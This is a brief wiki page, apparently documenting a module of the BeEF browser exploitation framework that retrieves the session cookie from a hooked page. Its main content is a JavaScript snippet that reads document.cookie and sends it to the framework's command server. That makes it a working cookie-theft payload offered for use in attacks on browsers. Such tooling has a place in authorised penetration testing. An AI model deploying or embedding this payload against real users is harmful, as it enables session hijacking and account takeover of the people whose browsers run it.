## Summary
* **Objective**: This module will retrieve the session cookie from the current page.
* **Date**: ???
* **Authors**: bcoles
* **Browsers**: All
* [[Code|https://github.com/beefproject/beef/tree/master/modules/browser/hooked_domain/get_cookie]]

## Internal Working

This module just gather the cookies for this page using the document.cookie function :

```javascript
beef.execute(function() {
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie);
});
```

## Feedback